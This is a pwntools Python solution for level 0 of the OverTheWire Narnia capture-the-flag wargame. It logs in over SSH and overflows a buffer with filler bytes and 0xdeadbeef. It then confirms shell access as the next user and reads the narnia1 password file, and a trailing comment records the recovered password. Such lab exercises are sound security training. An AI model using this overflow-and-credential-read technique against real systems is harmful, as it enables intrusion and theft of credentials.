from pwn import *

# vars ...
user = 'narnia0'
host = 'narnia.labs.overthewire.org'
password = 'narnia0'
shell = ssh(user, host, password=password)
sh = shell.run('bash')
sh.recvuntil('$ ')
############################################
sh.sendline('cd /narnia/')
sh.recvuntil('$ ')
fill = b'C'*20
exp = p32(0xdeadbeef)
log.info('trying exploit ...')
sh.sendline('./narnia0')
sh.sendline(fill + exp)
r = sh.recvuntil('$ ')
log.info(r)
log.info('checking if it works ... ')
sh.sendline('whoami')
if sh.recvuntil('$ ').decode()[:7] == 'narnia1':
    log.success('pwned')
    log.info('fetching password')
    sh.sendline('cat /etc/narnia_pass/narnia1')
    p = sh.recvuntil('$').decode()
    log.success(p[:p.index('\n')])
else:
    log.critical('exploit failed!!')

#pass efeidiedae
